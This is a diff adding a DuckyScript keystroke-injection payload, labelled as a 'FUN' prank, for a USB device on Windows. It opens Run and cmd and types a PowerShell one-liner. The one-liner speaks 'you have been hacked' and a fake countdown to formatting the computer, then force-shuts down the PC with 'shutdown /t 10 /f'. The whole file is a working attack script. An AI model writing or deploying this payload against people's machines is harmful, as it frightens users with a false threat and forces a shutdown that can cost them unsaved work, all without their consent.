@@ -1,0 +1,13 @@
+REM Author: Z3R0NOM1	
+REM Description: Makes the computer talk and shutdown the PC.
+REM Version: 0.5
+REM Category: FUN
+GUI r
+DELAY 100
+STRING cmd
+ENTER
+DELAY 100
+STRING powershell.exe -nop -c "Add-Type -AssemblyName System.speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('Hello. you have been hacked!'); $synth.Speak('I am going to format your computer in 10 seconds'); $synth.Speak('9, 8, 7, 6, 5, 4, 3, 2, 1')"; shutdown /t 10 /f
+ENTER
+DELAY 100
+GUI DOWNARROW
